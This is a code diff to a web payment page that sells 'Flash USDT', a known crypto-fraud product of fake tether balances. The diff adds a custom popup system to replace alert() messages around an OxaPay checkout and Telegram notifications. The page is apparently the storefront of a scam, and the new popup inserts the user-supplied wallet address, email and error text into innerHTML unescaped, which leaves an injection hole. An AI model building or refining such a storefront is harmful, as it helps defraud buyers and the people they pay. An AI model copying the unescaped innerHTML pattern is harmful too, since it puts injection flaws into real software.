@@ -167,6 +167,85 @@
             from { transform: translateY(-50px); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
+        
+        /* Custom Website Popup System */
+        .custom-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease;
+        }
+        .custom-popup-content {
+            background: linear-gradient(135deg, #0F101E 0%, #1a1b2e 100%);
+            border-radius: 20px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            animation: slideIn 0.3s ease;
+            border: 1px solid rgba(226, 117, 255, 0.3);
+        }
+        .custom-popup-header {
+            padding: 1.5rem 2rem 1rem;
+            text-align: center;
+            border-bottom: 1px solid rgba(226, 117, 255, 0.2);
+        }
+        .custom-popup-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #E275FF 0%, #00D4AA 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            animation: pulse 2s infinite;
+        }
+        .custom-popup-icon i {
+            color: white;
+            font-size: 1.5rem;
+        }
+        .custom-popup-title {
+            color: #E275FF;
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin: 0;
+        }
+        .custom-popup-body {
+            padding: 1rem 2rem;
+        }
+        .custom-popup-message {
+            color: #FFFFFF;
+            margin: 0;
+            line-height: 1.6;
+            font-size: 1rem;
+            text-align: center;
+        }
+        .custom-popup-footer {
+            padding: 1rem 2rem 2rem;
+            text-align: center;
+        }
+        .custom-popup-button {
+            background: linear-gradient(135deg, #E275FF 0%, #00D4AA 100%);
+            border: none;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1rem;
+        }
+        .custom-popup-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(226, 117, 255, 0.3);
+        }
         @keyframes pulse {
             0% { transform: scale(1); }
             50% { transform: scale(1.05); }
@@ -338,6 +417,26 @@
             <button class="popup-button" onclick="closeConfirmationPopup()">
                 <i class="fas fa-home me-2"></i>Continue
             </button>
+        </div>
+    </div>
+
+    <!-- Custom Website Popup System -->
+    <div id="customPopup" class="custom-popup-overlay" style="display: none;">
+        <div class="custom-popup-content">
+            <div class="custom-popup-header">
+                <div class="custom-popup-icon" id="customPopupIcon">
+                    <i class="fas fa-info-circle"></i>
+                </div>
+                <h3 class="custom-popup-title" id="customPopupTitle">Information</h3>
+            </div>
+            <div class="custom-popup-body">
+                <p class="custom-popup-message" id="customPopupMessage">Message content</p>
+            </div>
+            <div class="custom-popup-footer">
+                <button class="custom-popup-button" id="customPopupButton" onclick="closeCustomPopup()">
+                    <i class="fas fa-check me-2"></i>OK
+                </button>
+            </div>
         </div>
     </div>
 
@@ -804,7 +903,7 @@
                 
                 // Validate form
                 if (!walletAddress || !email) {
-                    alert('Please fill in all required fields');
+                    showCustomPopup('warning', 'Required Fields', 'Please fill in all required fields');
                     return;
                 }
                 
@@ -888,7 +987,10 @@
                     window.open(payLink, '_blank');
                     
                     // Show success message
-                    alert('Payment page opened! Complete your payment in the new tab.\n\nAfter payment, Flash USDT will be sent to:\n' + walletAddress);
+                    showCustomPopup('success', 'Payment Page Opened', 
+                        'Payment page opened! Complete your payment in the new tab.<br><br>' +
+                        'After payment, Flash USDT will be sent to:<br>' +
+                        '<strong>' + walletAddress + '</strong>');
                     
                     // Start checking payment status
                     startPaymentStatusCheck(paymentData.data.track_id);
@@ -899,7 +1001,7 @@
                 
             } catch (error) {
                 console.error('❌ OxaPay payment creation failed:', error);
-                alert('Payment failed: ' + error.message);
+                showCustomPopup('error', 'Payment Failed', 'Payment failed: ' + error.message);
             } finally {
                 // Reset button
                 $('#pay-button').html('<i class="fas fa-credit-card"></i> Pay ' + amount + ' USDT Securely').prop('disabled', false);
@@ -966,7 +1068,13 @@
             // Send Telegram notification
             sendTelegramNotification(walletAddress, amount, trackId);
             
-            alert(`🎉 Payment Successful!\n\nAmount: ${paymentData.amount} ${paymentData.currency.toUpperCase()}\nTrack ID: ${paymentData.track_id}\nStatus: ${paymentData.status}\n\nFlash USDT will be sent to: ${walletAddress}\nConfirmation email sent to: ${email}`);
+            showCustomPopup('success', 'Payment Successful!', 
+                `🎉 Payment Successful!<br><br>` +
+                `Amount: ${paymentData.amount} ${paymentData.currency.toUpperCase()}<br>` +
+                `Track ID: ${paymentData.track_id}<br>` +
+                `Status: ${paymentData.status}<br><br>` +
+                `Flash USDT will be sent to: <strong>${walletAddress}</strong><br>` +
+                `Confirmation email sent to: <strong>${email}</strong>`);
         }
 
         // Send confirmation email
@@ -1085,7 +1193,11 @@
         function showPaymentFailed(paymentData) {
             console.log('❌ Payment failed!', paymentData);
             
-            alert(`❌ Payment ${paymentData.status}\n\nAmount: ${paymentData.amount} ${paymentData.currency.toUpperCase()}\nTrack ID: ${paymentData.track_id}\n\nPlease try again or contact support.`);
+            showCustomPopup('error', 'Payment Failed', 
+                `❌ Payment ${paymentData.status}<br><br>` +
+                `Amount: ${paymentData.amount} ${paymentData.currency.toUpperCase()}<br>` +
+                `Track ID: ${paymentData.track_id}<br><br>` +
+                `Please try again or contact support.`);
         }
         
         // Check for payment success on page load
@@ -1149,6 +1261,39 @@
             document.getElementById('paymentConfirmationPopup').style.display = 'none';
             // Redirect to home page
             window.location.href = 'https://flashusdt-nu.vercel.app/';
+        }
+        
+        // Custom Popup System Functions
+        function showCustomPopup(type, title, message, buttonText = 'OK') {
+            const popup = document.getElementById('customPopup');
+            const icon = document.getElementById('customPopupIcon');
+            const titleEl = document.getElementById('customPopupTitle');
+            const messageEl = document.getElementById('customPopupMessage');
+            const buttonEl = document.getElementById('customPopupButton');
+            
+            // Set icon based on type
+            const iconClass = {
+                'info': 'fas fa-info-circle',
+                'success': 'fas fa-check-circle',
+                'warning': 'fas fa-exclamation-triangle',
+                'error': 'fas fa-times-circle'
+            };
+            
+            icon.innerHTML = `<i class="${iconClass[type] || iconClass['info']}"></i>`;
+            titleEl.textContent = title;
+            messageEl.innerHTML = message;
+            buttonEl.innerHTML = `<i class="fas fa-check me-2"></i>${buttonText}`;
+            
+            popup.style.display = 'flex';
+        }
+        
+        function closeCustomPopup() {
+            document.getElementById('customPopup').style.display = 'none';
+        }
+        
+        // Replace alert function
+        function customAlert(message, type = 'info') {
+            showCustomPopup(type, 'Information', message);
         }
         
         // Send payment success notifications using existing system
